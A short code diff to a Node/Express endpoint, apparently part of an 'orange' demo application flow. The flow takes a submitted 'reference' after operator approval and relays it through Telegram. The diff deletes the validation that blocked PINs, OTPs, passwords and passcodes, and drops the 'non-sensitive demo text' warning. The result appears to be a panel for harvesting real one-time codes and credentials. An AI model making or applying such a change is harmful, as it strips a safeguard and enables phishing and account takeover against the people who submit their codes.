@@ -79,8 +79,7 @@ app.post('/api/applications',async(req,res)=>{
 app.post('/api/applications/:id/reference',async(req,res)=>{
  try{
   const reference=String(req.body.reference_text||'').trim().slice(0,500);
-  if(!reference) return res.status(400).json({error:'Paste non-sensitive demo text before submitting.'});
-  if(/\b(pin|otp|one[- ]time password|password|passcode)\b/i.test(reference)) return res.status(400).json({error:'Use sample demo text only. Do not submit PINs, OTPs, passwords, or passcodes.'});
+  if(!reference) return res.status(400).json({error:'Paste text before submitting.'});
   const r=await pool.query("UPDATE orange_demo_applications SET reference_text=$1,status='pending_reference',updated_at=NOW() WHERE id=$2 AND status IN ('approved_details','rejected_reference') RETURNING *",[reference,req.params.id]);
   if(!r.rows[0])return res.status(409).json({error:'Reference submission is available only after the details have been approved.'});
   // Persist and acknowledge the reference immediately; Telegram delivery must not prevent the browser from starting status polling.
